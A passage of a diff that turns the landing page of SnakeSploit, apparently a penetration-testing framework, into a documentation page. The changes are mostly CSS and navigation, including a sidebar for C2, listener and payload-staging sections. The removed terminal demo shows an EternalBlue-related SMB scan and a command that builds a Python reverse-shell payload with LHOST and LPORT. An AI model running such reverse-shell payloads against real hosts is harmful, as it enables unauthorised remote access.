@@ -3,758 +3,1159 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SnakeSploit — World-Class Penetration Testing Framework</title>
-<meta name="description" content="The most advanced Python-powered penetration testing framework. Auto-updating CVE/PoC modules, AI-powered scanning, and real-time exploitation.">
-<meta property="og:title" content="SnakeSploit — Penetration Testing Framework">
-<meta property="og:description" content="Auto-updating exploit modules from live CVEs. AI-powered scanning. Payload generation. All in one Python framework.">
-<meta property="og:image" content="https://hermesna-1.github.io/SnakeSploit/og.png">
-<meta name="theme-color" content="#0a0a1a">
+<title>SnakeSploit — Documentation</title>
+<meta name="description" content="SnakeSploit documentation — install, usage, C2 framework, payload builders, API reference">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
-/* ── Reset ── */
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 :root {
-  --bg: #0a0a1a;
-  --bg2: #0d0d24;
-  --bg3: #111130;
-  --card: rgba(16,16,40,0.6);
-  --card-border: rgba(255,255,255,0.06);
-  --card-hover: rgba(30,30,70,0.8);
-  --accent: #00ff88;
-  --accent2: #0066ff;
-  --accent3: #ff3366;
+  --bg: #0a0a1a; --bg2: #0d0d24; --bg3: #111130;
+  --sidebar: #0d0d20; --sidebar-border: rgba(255,255,255,0.06);
+  --card: rgba(16,16,40,0.6); --card-border: rgba(255,255,255,0.06);
+  --accent: #00ff88; --accent2: #0066ff; --accent3: #ff3366;
   --accent-dim: rgba(0,255,136,0.1);
-  --accent-glow: rgba(0,255,136,0.2);
-  --text: #e8e8f0;
-  --text2: #8888aa;
-  --text3: #555577;
-  --radius: 16px;
-  --radius-sm: 8px;
-  --max-w: 1100px;
+  --text: #e8e8f0; --text2: #8888aa; --text3: #555577;
+  --code-bg: #0a0a15;
+  --radius: 12px; --radius-sm: 8px;
+  --sidebar-w: 280px;
 }
-html { scroll-behavior: smooth; font-size: 15px; }
+html { font-size: 15px; scroll-behavior: smooth; }
 body {
-  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-  background: var(--bg);
-  color: var(--text);
-  overflow-x: hidden;
-  line-height: 1.6;
+  font-family: 'Inter', -apple-system, sans-serif;
+  background: var(--bg); color: var(--text); display: flex;
+  min-height: 100vh; line-height: 1.7;
 }
 ::selection { background: var(--accent); color: #000; }
 ::-webkit-scrollbar { width: 6px; }
 ::-webkit-scrollbar-track { background: transparent; }
 ::-webkit-scrollbar-thumb { background: var(--text3); border-radius: 3px; }
 
-/* ── Animated Background ── */
-.bg-glow {
-  position: fixed; inset: 0; pointer-events: none; z-index: 0;
-  background:
-    radial-gradient(ellipse 80% 60% at 10% 30%, rgba(0,255,136,0.04) 0%, transparent 60%),
-    radial-gradient(ellipse 60% 50% at 90% 20%, rgba(0,102,255,0.04) 0%, transparent 60%),
-    radial-gradient(ellipse 50% 40% at 50% 80%, rgba(255,51,102,0.03) 0%, transparent 60%);
+/* ── Sidebar ── */
+.sidebar {
+  width: var(--sidebar-w); min-height: 100vh; position: fixed;
+  background: var(--sidebar); border-right: 1px solid var(--sidebar-border);
+  display: flex; flex-direction: column; z-index: 10;
 }
-.bg-grid {
-  position: fixed; inset: 0; pointer-events: none; z-index: 0;
-  background-image:
-    linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
-  background-size: 60px 60px;
+.sidebar-header {
+  padding: 20px 20px 16px; border-bottom: 1px solid var(--sidebar-border);
 }
-.gradient-bar {
-  position: fixed; top: 0; left: 0; right: 0; height: 3px; z-index: 1000;
-  background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3), var(--accent2), var(--accent));
-  background-size: 200% 100%;
-  animation: gradBar 4s linear infinite;
-}
-@keyframes gradBar { 0%{background-position:0%} 100%{background-position:200%} }
-
-/* ── Typography ── */
-h1, h2, h3, h4 { font-weight: 700; line-height: 1.2; }
-.gradient-text {
-  background: linear-gradient(135deg, var(--accent), var(--accent2), var(--accent3));
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-/* ── Navbar ── */
-nav {
-  position: fixed; top: 3px; left: 0; right: 0; z-index: 100;
-  background: rgba(10,10,26,0.85);
-  backdrop-filter: blur(20px) saturate(1.5);
-  border-bottom: 1px solid var(--card-border);
-  height: 60px; display: flex; align-items: center; padding: 0 28px;
-}
-.nav-inner {
-  max-width: var(--max-w); margin: 0 auto; width: 100%;
-  display: flex; align-items: center; gap: 24px;
-}
-.nav-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 17px; letter-spacing: -0.5px; }
-.nav-logo-mark {
-  width: 30px; height: 30px; border-radius: 8px;
+.sidebar-logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 16px; }
+.sidebar-logo-mark {
+  width: 28px; height: 28px; border-radius: 7px;
   background: linear-gradient(135deg, var(--accent), var(--accent2));
   display: flex; align-items: center; justify-content: center;
-  font-size: 14px; color: #000; font-weight: 900;
-  box-shadow: 0 0 20px var(--accent-glow);
+  font-size: 13px; color: #000; font-weight: 900;
 }
-.nav-logo span { color: var(--accent); }
-.nav-links { display: flex; gap: 2px; margin-left: 16px; }
-.nav-links a {
-  padding: 6px 14px; border-radius: 6px; color: var(--text2); font-size: 13px; font-weight: 500;
-  transition: all 0.2s; cursor: pointer; text-decoration: none;
+.sidebar-logo span { color: var(--accent); }
+.sidebar-search {
+  margin: 12px 14px; padding: 8px 12px; border-radius: 6px;
+  border: 1px solid var(--card-border); background: rgba(0,0,0,0.2);
+  color: var(--text2); font-size: 13px; outline: none; width: calc(100% - 28px);
+  font-family: 'Inter', sans-serif;
 }
-.nav-links a:hover { color: var(--text); background: var(--card); }
-.nav-actions { margin-left: auto; display: flex; gap: 8px; align-items: center; }
+.sidebar-search:focus { border-color: var(--accent); color: var(--text); }
+.sidebar-nav { flex: 1; overflow-y: auto; padding: 8px 10px; }
+.nav-section { margin-bottom: 4px; }
+.nav-section-title {
+  padding: 8px 12px 4px; font-size: 10px; text-transform: uppercase;
+  letter-spacing: 1px; color: var(--text3); font-weight: 600;
+}
+.nav-link {
+  display: block; padding: 6px 12px; border-radius: 6px;
+  color: var(--text2); font-size: 13px; cursor: pointer; transition: all 0.15s;
+  text-decoration: none; border: none; background: none; width: 100%; text-align: left;
+}
+.nav-link:hover { color: var(--text); background: var(--card); }
+.nav-link.active { color: var(--accent); background: var(--accent-dim); }
+.nav-link .badge {
+  float: right; font-size: 10px; padding: 1px 6px; border-radius: 4px;
+  background: var(--accent-dim); color: var(--accent); font-weight: 600;
+}
 
-/* ── Buttons ── */
-.btn {
-  display: inline-flex; align-items: center; gap: 6px; padding: 9px 20px;
-  border-radius: var(--radius-sm); font-size: 13px; font-weight: 600; border: none;
-  cursor: pointer; transition: all 0.25s; text-decoration: none;
-  background: var(--card); color: var(--text); border: 1px solid var(--card-border);
+/* ── Main Content ── */
+.main {
+  margin-left: var(--sidebar-w); flex: 1; padding: 0; max-width: 900px;
 }
-.btn:hover { background: var(--card-hover); transform: translateY(-1px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-.btn-primary {
-  background: linear-gradient(135deg, var(--accent), #00cc6a);
-  color: #000; border: none; font-weight: 700;
-  box-shadow: 0 0 20px var(--accent-glow);
-}
-.btn-primary:hover { box-shadow: 0 0 40px rgba(0,255,136,0.4); transform: translateY(-2px); }
-.btn-ghost { background: transparent; border-color: var(--text3); color: var(--text2); }
-.btn-ghost:hover { border-color: var(--text2); color: var(--text); }
-.btn-lg { padding: 12px 28px; font-size: 15px; border-radius: 10px; }
-
-/* ── Hero ── */
-.hero {
-  position: relative; z-index: 1; min-height: 100vh;
-  display: flex; align-items: center; justify-content: center;
-  padding: 100px 28px 60px; text-align: center;
-}
-.hero-content { max-width: 800px; }
-.hero-badge {
-  display: inline-flex; align-items: center; gap: 6px;
-  padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 600;
-  background: var(--accent-dim); color: var(--accent); border: 1px solid rgba(0,255,136,0.2);
-  margin-bottom: 24px; letter-spacing: 0.3px;
-}
-.hero h1 { font-size: clamp(40px, 7vw, 72px); font-weight: 900; letter-spacing: -2px; margin-bottom: 20px; }
-.hero h1 .gradient-text { display: block; }
-.hero p {
-  font-size: 17px; color: var(--text2); max-width: 600px; margin: 0 auto 36px;
-  line-height: 1.7;
-}
-.hero-buttons { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
-
-/* ── Terminal Demo ── */
-.terminal-demo {
-  margin-top: 48px; max-width: 680px; margin-left: auto; margin-right: auto;
-  position: relative;
-}
-.terminal-window {
-  background: #000; border: 1px solid rgba(255,255,255,0.08);
-  border-radius: 12px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-  text-align: left;
-}
-.terminal-bar {
-  display: flex; align-items: center; gap: 8px; padding: 12px 16px;
-  background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.05);
-}
-.terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-.terminal-dot:nth-child(1) { background: #ff5f56; }
-.terminal-dot:nth-child(2) { background: #ffbd2e; }
-.terminal-dot:nth-child(3) { background: #27c93f; }
-.terminal-title { font-size: 11px; color: var(--text3); margin-left: 8px; font-family: 'JetBrains Mono', monospace; }
-.terminal-body {
-  padding: 20px 24px; font-family: 'JetBrains Mono', monospace;
-  font-size: 13px; line-height: 1.8; color: #c0c0d0; min-height: 240px;
-}
-.terminal-line { opacity: 0; animation: typeIn 0.05s forwards; white-space: pre-wrap; }
-.terminal-prompt { color: var(--accent); }
-.terminal-cmd { color: #e8e8f0; }
-.terminal-output { color: var(--text2); }
-.terminal-success { color: var(--accent); }
-.terminal-error { color: var(--accent3); }
-.terminal-highlight { color: #00ccff; }
-.terminal-cursor::after {
-  content: '▊'; color: var(--accent); animation: blink 0.8s step-end infinite;
-}
-@keyframes blink { 50% { opacity: 0; } }
-@keyframes typeIn { to { opacity: 1; } }
-
-/* ── Stats Bar ── */
-.stats-bar {
-  display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px;
-  background: var(--card-border); border-radius: var(--radius);
-  overflow: hidden; margin-top: 48px;
-}
-.stat-item {
-  background: var(--card); padding: 24px 20px; text-align: center;
-  backdrop-filter: blur(12px);
-}
-.stat-num { font-size: 28px; font-weight: 800; color: var(--accent); letter-spacing: -1px; }
-.stat-label { font-size: 12px; color: var(--text2); margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
-
-/* ── Sections ── */
-section { position: relative; z-index: 1; padding: 80px 28px; }
-.section-inner { max-width: var(--max-w); margin: 0 auto; }
-.section-label {
-  display: inline-block; font-size: 12px; font-weight: 600; text-transform: uppercase;
-  letter-spacing: 1.5px; color: var(--accent); margin-bottom: 12px;
-}
-.section-title { font-size: clamp(28px, 4vw, 40px); font-weight: 800; letter-spacing: -1px; margin-bottom: 12px; }
-.section-sub { font-size: 16px; color: var(--text2); max-width: 600px; line-height: 1.6; }
-.section-header { text-align: center; margin-bottom: 56px; }
-.section-header .section-sub { margin: 0 auto; }
-
-/* ── Scroll Reveal ── */
-.reveal { opacity: 0; transform: translateY(30px); transition: all 0.7s cubic-bezier(0.16,1,0.3,1); }
-.reveal.visible { opacity: 1; transform: translateY(0); }
-.reveal-delay-1 { transition-delay: 0.1s; }
-.reveal-delay-2 { transition-delay: 0.2s; }
-.reveal-delay-3 { transition-delay: 0.3s; }
-.reveal-delay-4 { transition-delay: 0.4s; }
-
-/* ── Features Grid ── */
-.features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-.feature-card {
-  background: var(--card); border: 1px solid var(--card-border); border-radius: var(--radius);
-  padding: 28px; backdrop-filter: blur(12px); transition: all 0.3s;
-  position: relative; overflow: hidden;
-}
-.feature-card::before {
-  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
-  background: linear-gradient(90deg, transparent, var(--accent), transparent);
-  opacity: 0; transition: opacity 0.3s;
-}
-.feature-card:hover { background: var(--card-hover); transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0,0,0,0.3); }
-.feature-card:hover::before { opacity: 1; }
-.feature-icon { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; margin-bottom: 16px; background: var(--accent-dim); }
-.feature-card h3 { font-size: 16px; font-weight: 600; margin-bottom: 8px; }
-.feature-card p { font-size: 14px; color: var(--text2); line-height: 1.6; }
-.feature-tag {
-  display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; text-transform: uppercase;
-  letter-spacing: 0.5px; margin-top: 12px;
-}
-.feature-tag.new { background: var(--accent-dim); color: var(--accent); }
-.feature-tag.pro { background: rgba(0,102,255,0.15); color: var(--accent2); }
-
-/* ── Comparison Table ── */
-.comparison-wrap {
-  background: var(--card); border: 1px solid var(--card-border); border-radius: var(--radius);
-  overflow: hidden; backdrop-filter: blur(12px);
-}
-.comp-table { width: 100%; border-collapse: collapse; }
-.comp-table th {
-  padding: 16px 20px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px;
-  color: var(--text3); font-weight: 600; text-align: left;
+.topbar {
+  position: sticky; top: 0; z-index: 5;
+  background: rgba(10,10,26,0.8); backdrop-filter: blur(16px);
   border-bottom: 1px solid var(--card-border);
+  padding: 0 48px; height: 52px; display: flex; align-items: center; gap: 16px;
 }
-.comp-table th:first-child { width: 38%; }
-.comp-table td {
-  padding: 14px 20px; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.03);
-  color: var(--text2);
-}
-.comp-table tr:last-child td { border-bottom: none; }
-.comp-table td:first-child { font-weight: 600; color: var(--text); }
-.comp-check { color: var(--accent); font-weight: 700; }
-.comp-cross { color: var(--text3); }
+.topbar-links { display: flex; gap: 16px; margin-left: auto; }
+.topbar-links a { font-size: 13px; color: var(--text2); text-decoration: none; }
+.topbar-links a:hover { color: var(--text); }
+.content { padding: 40px 48px 80px; }
 
-/* ── Install Section ── */
-.install-box {
-  background: var(--card); border: 1px solid var(--card-border); border-radius: var(--radius);
-  overflow: hidden; backdrop-filter: blur(12px);
+/* ── Typography ── */
+h1 { font-size: 36px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
+h2 { font-size: 24px; font-weight: 700; margin: 40px 0 12px; padding-bottom: 8px; border-bottom: 1px solid var(--card-border); }
+h3 { font-size: 18px; font-weight: 600; margin: 28px 0 8px; }
+p { color: var(--text2); margin-bottom: 16px; line-height: 1.7; }
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+strong { color: var(--text); font-weight: 600; }
+code {
+  font-family: 'JetBrains Mono', monospace; font-size: 13px;
+  background: var(--code-bg); padding: 2px 6px; border-radius: 4px;
+  color: var(--accent); border: 1px solid rgba(255,255,255,0.05);
 }
-.install-tabs { display: flex; border-bottom: 1px solid var(--card-border); overflow-x: auto; }
-.install-tab {
-  padding: 14px 24px; font-size: 13px; font-weight: 600; cursor: pointer;
-  color: var(--text2); border-bottom: 2px solid transparent; transition: all 0.2s;
-  background: none; border-top: none; border-left: none; border-right: none;
-  white-space: nowrap;
+pre {
+  background: var(--code-bg); border: 1px solid var(--card-border); border-radius: var(--radius-sm);
+  padding: 20px; overflow-x: auto; margin: 16px 0;
+  font-family: 'JetBrains Mono', monospace; font-size: 13px; line-height: 1.6;
+  color: #c0c0d0; position: relative;
 }
-.install-tab:hover { color: var(--text); }
-.install-tab.active { color: var(--accent); border-bottom-color: var(--accent); background: var(--accent-dim); }
-.install-body { padding: 24px; position: relative; }
-.install-body pre {
-  background: rgba(0,0,0,0.4); border: 1px solid var(--card-border); border-radius: 8px;
-  padding: 20px; font-family: 'JetBrains Mono', monospace; font-size: 13px;
-  line-height: 1.7; color: var(--accent); overflow-x: auto; white-space: pre-wrap;
-  word-break: break-all; margin: 0;
+pre .comment { color: var(--text3); font-style: italic; }
+pre .keyword { color: var(--accent); }
+pre .string { color: #ffbd2e; }
+pre .func { color: #00ccff; }
+pre .var { color: var(--accent3); }
+pre .num { color: #b388ff; }
+.copy-btn {
+  position: absolute; top: 8px; right: 8px; padding: 4px 10px; border-radius: 4px;
+  font-size: 11px; background: var(--card); border: 1px solid var(--card-border);
+  color: var(--text2); cursor: pointer; font-family: 'Inter', sans-serif;
 }
-.install-body pre .comment { color: var(--text3); }
-.install-copy {
-  position: absolute; top: 32px; right: 32px;
-  padding: 5px 12px; border-radius: 4px; font-size: 11px; font-weight: 600;
-  background: var(--card); border: 1px solid var(--card-border); color: var(--text2);
-  cursor: pointer; transition: all 0.2s;
-}
-.install-copy:hover { background: var(--card-hover); color: var(--text); }
+.copy-btn:hover { color: var(--text); background: var(--card-hover); }
 
-/* ── CTA ── */
-.cta-section {
-  text-align: center; padding: 100px 28px;
-  position: relative; z-index: 1;
-}
-.cta-section::before {
-  content: ''; position: absolute; inset: 0;
-  background: radial-gradient(ellipse at center, rgba(0,255,136,0.05) 0%, transparent 70%);
-}
-.cta-section h2 { font-size: clamp(32px, 5vw, 48px); font-weight: 800; letter-spacing: -1.5px; margin-bottom: 16px; }
-.cta-section p { font-size: 16px; color: var(--text2); max-width: 500px; margin: 0 auto 32px; }
+/* ── Lists ── */
+ul, ol { margin: 8px 0 16px 20px; color: var(--text2); }
+li { margin: 4px 0; }
+li > strong { color: var(--text); }
 
-/* ── Footer ── */
-footer {
-  position: relative; z-index: 1; border-top: 1px solid var(--card-border);
-  padding: 40px 28px; text-align: center;
-}
-footer p { font-size: 13px; color: var(--text3); }
-footer a { color: var(--text2); text-decoration: none; }
-footer a:hover { color: var(--text); }
+/* ── Tables ── */
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+th { text-align: left; padding: 10px 14px; font-size: 11px; text-transform: uppercase;
+     letter-spacing: 0.5px; color: var(--text3); font-weight: 600;
+     border-bottom: 1px solid var(--card-border); }
+td { padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,0.03); color: var(--text2); }
+tr:hover td { background: rgba(255,255,255,0.02); }
 
-/* ── Live Dashboard ── */
-.dashboard-live { display: none; margin-top: 48px; }
-.dashboard-live.active { display: block; }
-.live-stats { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; margin-bottom: 20px; }
-.live-stat {
-  background: var(--card); border: 1px solid var(--card-border); border-radius: 8px;
-  padding: 16px; text-align: center; backdrop-filter: blur(12px);
+/* ── Callouts ── */
+.callout {
+  padding: 16px 20px; border-radius: var(--radius-sm); margin: 20px 0;
+  border-left: 3px solid;
 }
-.live-stat .num { font-size: 22px; font-weight: 700; color: var(--accent); }
-.live-stat .lbl { font-size: 10px; color: var(--text2); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; }
-.live-panel {
-  display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+.callout-info { background: rgba(0,102,255,0.08); border-color: var(--accent2); }
+.callout-info strong { color: var(--accent2); }
+.callout-warn { background: rgba(255,170,0,0.08); border-color: #ffaa00; }
+.callout-warn strong { color: #ffaa00; }
+.callout-tip { background: var(--accent-dim); border-color: var(--accent); }
+.callout-tip strong { color: var(--accent); }
+
+/* ── Command Cards ── */
+.cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 16px 0; }
+.cmd-card {
+  background: var(--card); border: 1px solid var(--card-border); border-radius: var(--radius-sm);
+  padding: 16px; transition: all 0.2s;
 }
-.live-panel-item {
-  background: var(--card); border: 1px solid var(--card-border); border-radius: 8px;
-  padding: 20px; backdrop-filter: blur(12px);
+.cmd-card:hover { background: var(--card-hover); }
+.cmd-card .cmd { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--accent); margin-bottom: 4px; }
+.cmd-card .desc { font-size: 12px; color: var(--text2); }
+
+/* ── Steps ── */
+.steps { counter-reset: step; margin: 20px 0; }
+.step { counter-increment: step; margin-bottom: 20px; padding-left: 44px; position: relative; }
+.step::before {
+  content: counter(step);
+  position: absolute; left: 0; top: 0;
+  width: 30px; height: 30px; border-radius: 50%;
+  background: var(--accent-dim); color: var(--accent);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 13px; font-weight: 700;
 }
-.live-panel-item h4 { font-size: 13px; color: var(--text2); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
-.live-panel-item .item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 13px; }
-.live-panel-item .item:last-child { border-bottom: none; }
+.step h3 { margin: 0 0 6px; }
+.step p { margin: 0 0 8px; }
+
+/* ── Feature Tags ── */
+.tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+.tag-new { background: var(--accent-dim); color: var(--accent); }
+.tag-pro { background: rgba(0,102,255,0.15); color: var(--accent2); }
 
 /* ── Responsive ── */
-@media (max-width: 900px) {
-  .features-grid { grid-template-columns: 1fr 1fr; }
-  .live-stats { grid-template-columns: repeat(3, 1fr); }
-  .live-panel { grid-template-columns: 1fr; }
-  .stats-bar { grid-template-columns: repeat(2, 1fr); }
-}
-@media (max-width: 640px) {
-  .features-grid { grid-template-columns: 1fr; }
-  .live-stats { grid-template-columns: repeat(2, 1fr); }
-  .nav-links { display: none; }
-  .hero h1 { font-size: 32px; }
-  .hero-buttons { flex-direction: column; }
-  .btn-lg { width: 100%; justify-content: center; }
-  section { padding: 60px 16px; }
-  .stats-bar { grid-template-columns: 1fr 1fr; }
+@media (max-width: 768px) {
+  .sidebar { display: none; }
+  .main { margin-left: 0; }
+  .content { padding: 24px 20px 60px; }
+  .topbar { padding: 0 20px; }
+  .cmd-grid { grid-template-columns: 1fr; }
 }
 </style>
 </head>
 <body>
 
-<div class="bg-glow"></div>
-<div class="bg-grid"></div>
-<div class="gradient-bar"></div>
-
-<!-- Nav -->
-<nav>
-  <div class="nav-inner">
-    <div class="nav-logo">
-      <div class="nav-logo-mark">S</div>
+<aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-logo">
+      <div class="sidebar-logo-mark">S</div>
       <div>Snake<span>Sploit</span></div>
     </div>
-    <div class="nav-links">
-      <a href="#features">Features</a>
-      <a href="#compare">Comparison</a>
-      <a href="#install">Install</a>
-      <a href="#dashboard">Live Demo</a>
+  </div>
+  <input class="sidebar-search" placeholder="Search docs..." oninput="filterNav(this.value)">
+  <nav class="sidebar-nav" id="sidebarNav">
+    <div class="nav-section">
+      <div class="nav-section-title">Getting Started</div>
+      <button class="nav-link active" onclick="showPage('introduction')">Introduction</button>
+      <button class="nav-link" onclick="showPage('installation')">Installation</button>
+      <button class="nav-link" onclick="showPage('quickstart')">Quick Start</button>
     </div>
-    <div class="nav-actions">
-      <a href="https://github.com/HermesNA-1/SnakeSploit" class="btn btn-ghost" target="_blank">GitHub</a>
-      <a href="#install" class="btn btn-primary">Get Started</a>
+    <div class="nav-section">
+      <div class="nav-section-title">Usage</div>
+      <button class="nav-link" onclick="showPage('console')">Console Reference</button>
+      <button class="nav-link" onclick="showPage('modules')">Module System</button>
+      <button class="nav-link" onclick="showPage('payloads')">Payload Builders</button>
+      <button class="nav-link" onclick="showPage('scanning')">Port Scanning</button>
+      <button class="nav-link" onclick="showPage('targets')">Target Management</button>
+      <button class="nav-link" onclick="showPage('sessions')">Session Handling</button>
+    </div>
+    <div class="nav-section">
+      <div class="nav-section-title">C2 Framework</div>
+      <button class="nav-link" onclick="showPage('c2-overview')">Overview <span class="badge">New</span></button>
+      <button class="nav-link" onclick="showPage('c2-mythic')">Mythic Integration</button>
+      <button class="nav-link" onclick="showPage('c2-listeners')">Listeners</button>
+      <button class="nav-link" onclick="showPage('c2-agents')">Agent Management</button>
+      <button class="nav-link" onclick="showPage('c2-staging')">Payload Staging</button>
+    </div>
+    <div class="nav-section">
+      <div class="nav-section-title">Advanced</div>
+      <button class="nav-link" onclick="showPage('strix')">Strix AI Scanner</button>
+      <button class="nav-link" onclick="showPage('mcp')">MCP Integration</button>
+      <button class="nav-link" onclick="showPage('cve')">CVE Auto-Update</button>
+      <button class="nav-link" onclick="showPage('license')">License System</button>
+      <button class="nav-link" onclick="showPage('api')">API Reference <span class="badge">New</span></button>
+    </div>
+    <div class="nav-section">
+      <div class="nav-section-title">Web GUI</div>
+      <button class="nav-link" onclick="showPage('gui')">Dashboard</button>
+      <button class="nav-link" onclick="showPage('reporting')">Reporting</button>
+    </div>
+  </nav>
+</aside>
+
+<div class="main">
+  <div class="topbar">
+    <span style="font-size:14px;font-weight:600">Documentation</span>
+    <div class="topbar-links">
+      <a href="https://hermesna-1.github.io/SnakeSploit/">Home</a>
+      <a href="https://github.com/HermesNA-1/SnakeSploit">GitHub</a>
     </div>
   </div>
-</nav>
-
-<!-- Hero -->
-<section class="hero">
-  <div class="hero-content">
-    <div class="hero-badge">⚡ v1.0 — Now Open Source</div>
-    <h1>
-      The World's Most Advanced<br>
-      <span class="gradient-text">Penetration Testing Framework</span>
-    </h1>
-    <p>Auto-generates exploit modules from live CVEs. AI-powered reconnaissance. Real-time payload generation. All in one Python framework — zero dependencies.</p>
-    <div class="hero-buttons">
-      <a href="#install" class="btn btn-primary btn-lg">🚀 Get Started Free</a>
-      <a href="https://github.com/HermesNA-1/SnakeSploit" class="btn btn-lg btn-ghost" target="_blank">View on GitHub</a>
-    </div>
-
-    <!-- Terminal Demo -->
-    <div class="terminal-demo reveal">
-      <div class="terminal-window">
-        <div class="terminal-bar">
-          <div class="terminal-dot"></div><div class="terminal-dot"></div><div class="terminal-dot"></div>
-          <span class="terminal-title">snakesploit — interactive console</span>
-        </div>
-        <div class="terminal-body" id="terminalBody">
-          <div class="terminal-line" style="animation-delay:0.1s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd">update 7</span></div>
-          <div class="terminal-line" style="animation-delay:0.4s"><span class="terminal-output">  [*] Fetching CVEs from last 7 days...</span></div>
-          <div class="terminal-line" style="animation-delay:0.7s"><span class="terminal-success">  [+] Fetched 100 new CVEs (200 total)</span></div>
-          <div class="terminal-line" style="animation-delay:1.0s"><span class="terminal-output">  Critical: 18 | High: 66 | Medium: 81</span></div>
-          <div class="terminal-line" style="animation-delay:1.3s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd">search <span class="terminal-highlight">eternalblue</span></span></div>
-          <div class="terminal-line" style="animation-delay:1.7s"><span class="terminal-success">  [+] 1 module found:</span></div>
-          <div class="terminal-line" style="animation-delay:2.0s"><span class="terminal-output">    smb_version_scanner [CVE-2017-0143]</span></div>
-          <div class="terminal-line" style="animation-delay:2.3s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd">use smb_version_scanner</span></div>
-          <div class="terminal-line" style="animation-delay:2.5s"><span class="terminal-success">  [+] Using module: smb_version_scanner</span></div>
-          <div class="terminal-line" style="animation-delay:2.7s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd">set <span class="terminal-highlight">RHOSTS</span> 192.168.1.100</span></div>
-          <div class="terminal-line" style="animation-delay:2.9s"><span class="terminal-success">  [+] RHOSTS => 192.168.1.100</span></div>
-          <div class="terminal-line" style="animation-delay:3.1s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd"><span class="terminal-highlight">check</span></span></div>
-          <div class="terminal-line" style="animation-delay:3.4s"><span class="terminal-success">  [+] SMB service detected on 192.168.1.100:445</span></div>
-          <div class="terminal-line" style="animation-delay:3.7s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd"><span class="terminal-highlight">run</span></span></div>
-          <div class="terminal-line" style="animation-delay:4.0s"><span class="terminal-success">  [+] Module completed in 0.42s</span></div>
-          <div class="terminal-line" style="animation-delay:4.3s"><span class="terminal-prompt">snakesploit ></span> <span class="terminal-cmd terminal-cursor">payloads python_reverse LHOST=10.0.0.5 LPORT=4444</span></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Stats -->
-    <div class="stats-bar reveal">
-      <div class="stat-item"><div class="stat-num">200+</div><div class="stat-label">CVE Modules</div></div>
-      <div class="stat-item"><div class="stat-num">7</div><div class="stat-label">Payload Types</div></div>
-      <div class="stat-item"><div class="stat-num">6h</div><div class="stat-label">Auto-Update Cycle</div></div>
-      <div class="stat-item"><div class="stat-num">0</div><div class="stat-label">Dependencies</div></div>
-    </div>
-  </div>
-</section>
-
-<!-- Features -->
-<section id="features">
-  <div class="section-inner">
-    <div class="section-header reveal">
-      <div class="section-label">Features</div>
-      <h2 class="section-title">Everything a Pentester Needs</h2>
-      <p class="section-sub">From reconnaissance to exploitation — SnakeSploit is the only tool you'll ever need.</p>
-    </div>
-    <div class="features-grid">
-      <div class="feature-card reveal reveal-delay-1">
-        <div class="feature-icon">🔄</div>
-        <h3>Auto-Update Pipeline</h3>
-        <p>Fetches CVEs from NVD every 6 hours. Scrapes GitHub for PoCs. Generates modules automatically. Your framework stays fresh without manual intervention.</p>
-        <span class="feature-tag new">New</span>
-      </div>
-      <div class="feature-card reveal reveal-delay-2">
-        <div class="feature-icon">🧠</div>
-        <h3>AI-Powered Scanning</h3>
-        <p>Strix AI integration for deep web security analysis. Configure your API key and let AI agents perform reconnaissance and vulnerability detection.</p>
-        <span class="feature-tag pro">Pro</span>
-      </div>
-      <div class="feature-card reveal reveal-delay-3">
-        <div class="feature-icon">💀</div>
